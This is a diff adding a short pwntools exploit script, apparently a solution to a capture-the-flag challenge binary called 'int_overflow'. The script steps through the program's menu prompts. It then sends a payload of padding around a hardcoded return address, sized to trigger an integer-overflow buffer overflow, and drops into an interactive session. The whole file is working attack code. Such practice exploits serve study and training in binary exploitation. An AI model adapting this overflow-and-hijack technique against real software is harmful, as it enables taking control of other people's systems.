@@ -1,0 +1,10 @@
+from pwn import *
+p = process('./int_overflow')
+p.recv()
+p.sendline("1")
+p.recv()
+p.sendline("d00m")
+p.recv()
+payload = flat(["a"*0x18 , 0x0804868B,"a"*0xe7])
+p.sendline(payload)
+p.interactive()
